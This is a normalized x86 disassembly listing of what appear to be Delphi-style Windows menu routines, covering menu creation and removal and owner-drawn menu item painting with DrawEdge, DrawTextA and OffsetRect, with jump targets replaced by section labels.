mov eax [ ebx + 0x68 ]
cmp edx eax
je r-xdata
test [ edx + 0x1c ] 0x8
jne r-xdata
pop ebx
retn
test eax eax
je r-xdata
mov eax edx
mov [ ebx + 0x68 ] eax
test eax eax
je r-xdata
xor ecx ecx
mov [ eax + 0x6c ] ecx
mov eax ebx
call sub_444fd8
mov [ eax + 0x6c ] ebx
mov edx ebx
call sub_41c588
sub_444f9c
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_41c908
mov eax ebx
call sub_446b5c
test eax eax
je r-xdata
cmp [ ebx + 0x74 ] 0x0
je r-xdata
mov eax ebx
call sub_446b5c
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_403360
pop esi
pop ebx
retn
mov eax ebx
call sub_444fd8
sub_444fd8
push ebx
push esi
push edi
push ebp
mov ebp eax
test [ ebp + 0x1c ] 0x8
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebp + 0x1c ] 0x2
je r-xdata
mov eax [ ebp + 0x6c ]
test eax eax
je r-xdata
mov [ ebp + 0x74 ] 0x1
jmp r-xdata
mov eax ebp
call sub_445108
push eax
call GetMenuItemCount
mov esi eax
test esi esi
sete bl
test esi esi
jle r-xdata
call sub_444fd8
jmp r-xdata
test bl bl
je r-xdata
push 0x400
mov edi esi
dec edi
push edi
mov eax ebp
call sub_445108
push eax
call GetMenuState
test al 0x4
jne r-xdata
cmp [ ebp + 0x64 ] 0x0
jne r-xdata
dec esi
test esi esi
jg r-xdata
push 0x400
push edi
mov eax ebp
call sub_445108
push eax
call RemoveMenu
mov bl 0x1
mov eax ebp
call sub_444e98
mov eax [ ebp + 0x70 ]
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
mov eax ebp
call sub_445108
push eax
call GetMenuItemCount
test eax eax
jne r-xdata
mov eax [ ebp + 0x34 ]
push eax
call DestroyMenu
xor eax eax
mov [ ebp + 0x34 ] eax
jmp r-xdata
xor edx edx
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_4450a8
push ebx
push esi
push edi
push ebp
push ecx
mov ebx ecx
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_446b74
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov edx ebp
mov eax edi
call sub_446b84
cmp bl [ eax + 0x3f ]
jbe r-xdata
mov edx ebp
mov eax edi
call sub_446b84
cmp bl [ eax + 0x3f ]
jae r-xdata
inc ebp
dec esi
jne r-xdata
mov edx ebp
mov eax edi
call sub_446b84
mov [ eax + 0x3f ] bl
mov eax [ rw-data ]
call sub_4441b0
jmp r-xdata
cmp ebp [ esp ]
jge r-xdata
sub_445108
push ebx
mov ebx eax
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov eax [ ebx + 0x34 ]
pop ebx
retn
mov eax [ ebx + 0x4 ]
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
call CreateMenu
mov [ ebx + 0x34 ] eax
call CreatePopupMenu
mov [ ebx + 0x34 ] eax
jmp r-xdata
mov eax ebx
call sub_444e98
mov eax [ rw-data ]
call sub_4441b0
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
sub_445154
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41c830
push ebx
push sub_444f08
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop esi
pop ebx
retn
sub_445198
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_44537c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_447130
mov edi eax
test edi edi
je r-xdata
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_403f34
test bh 0x4
je r-xdata
mov eax edi
call sub_44876c
test al al
je r-xdata
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4042a8
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
test bl 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_41fddc
cmp [ esi + 0x3a ] 0x0
je r-xdata
test bh 0x4
jne r-xdata
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404164
mov eax [ ebp - 0xc ]
cmp [ eax ] 0x26
jne r-xdata
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
and ebx 0xffffffff
or ebx 0x2
jmp r-xdata
cmp [ esi + 0x39 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edi [ eax + 0xc ]
mov eax edi
call sub_41f7b4
mov edx eax
or dl [ r-xdata ]
mov eax edi
call sub_41f7c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445383
lea eax [ ebp - 0xc ]
call sub_403e9c
retn
mov eax [ ebp + 0x10 ]
mov esi eax
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add [ ebp - 0x18 ] 0x4
push 0x2
push 0x6
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4203c0
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x1 ] 0x0
jne r-xdata
or ebx 0x20000
and ebx 0xfffffffd
or ebx 0x0
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0xc ]
call sub_40415c
push eax
mov eax [ ebp - 0xc ]
call sub_40435c
push eax
mov eax [ ebp - 0x4 ]
call sub_4203c0
push eax
call DrawTextA
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x10 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_41f4f4
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0xc ]
call sub_40415c
push eax
mov eax [ ebp - 0xc ]
call sub_40435c
push eax
mov eax [ ebp - 0x4 ]
call sub_4203c0
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
mov eax [ ebp + 0x10 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000010
call sub_41f4f4
mov eax 0xff00000d
call sub_41f034
mov esi eax
mov eax 0xff000010
call sub_41f034
cmp esi eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_41f4f4
jmp r-xdata
sub_4453e8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_445cd0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_420064
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001d
call sub_41fcc0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_41f4f4
jmp r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov al [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_4042a8
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001e
call sub_41fcc0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_420064
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] 0xfffffffc
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x8 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x41 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_4421ac
cmp ebx eax
jl r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov esi [ eax + 0x4c ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx eax [ eax + 0x38 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4203c0
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41fcb8
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_41fcc0
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_422ab8
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4c ] eax
xor eax eax
push ebp
push sub_44582f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x7ff8
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_423ba0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff000012
call sub_41f4f4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx - 0xc ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_4421ac
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_41fcc0
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_420064
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41fcb8
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov edx 0xff000014
mov eax 0xff00000f
call sub_424ba4
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41fc94
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_420064
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x20 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
mov ax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x64 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x65 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_420064
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4201a0
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x5c ]
lea edi [ edx - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0x10 ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx esi
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x10 ]
sub edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov al [ eax + 0x39 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_44249c
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41fcc0
mov eax [ ebp + 0x8 ]
inc [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_445198
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x58 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub eax edx
sar eax 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov dl [ r-xdata ]
call sub_41f7c0
mov eax [ ebp + 0x8 ]
or [ eax - 0x64 ] 0x100000
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4203c0
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0xc ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
pop ecx
call sub_41ffb8
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
call sub_41f4f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_403164
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
push eax
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4203c0
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_445198
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov bx [ eax + 0x60 ]
test bx bx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445cd7
lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
sub eax 0xa
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
push 0x2
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax ebx
call sub_44425c
mov ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_445198
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
sub_445cf0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_4465f8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_420064
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001d
call sub_41fcc0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_41f4f4
jmp r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
